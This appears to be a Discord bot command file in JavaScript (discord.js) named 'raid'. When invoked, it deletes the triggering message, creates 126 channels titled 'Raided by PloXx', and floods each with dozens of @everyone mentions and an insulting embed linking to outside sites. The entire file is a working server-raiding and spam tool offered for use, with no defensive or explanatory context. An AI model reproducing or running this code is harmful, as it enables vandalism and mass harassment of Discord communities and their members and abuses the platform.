const chalk = require("chalk");
const Discord = require("discord.js")
const { Client, MessageEmbed } = require('discord.js');

module.exports = {
    name: 'raid',
    description: 'raider command',
    execute(message, args) {
        message.delete()
        console.log((chalk.red(`Raid iniciado en ${message.guild.name}`)));
        for (let i = 0; i <= 125; i++) {
            message.guild.channels.create('Raided by 倍PloXx倍', {
                type: 'text'
            }).then(channel => {
            
                const embed = new MessageEmbed()
                .setTitle('Raid By 倍PloXx倍')
                .setDescription('THIS SERVER HAS BEEN FVCKED BY PloXx RAID SYSTEM')
                .addField('JODETE :)', 'https://lloreria.es')
                .addField('YouTube', 'https://www.youtube.com/channel/UCllG9J2KuYBoi0cHk9-VqyQ')
                .setImage('https://cdn.discordapp.com/attachments/857710148289298462/857710300797861968/OIP_3.jpg')
                             
                channel.send("***@everyone RaidBy倍PloXx倍***", embed)
                channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
                channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)
				channel.send("***@everyone RaidBy倍PloXx倍***", embed)              
            })
        }
    }
}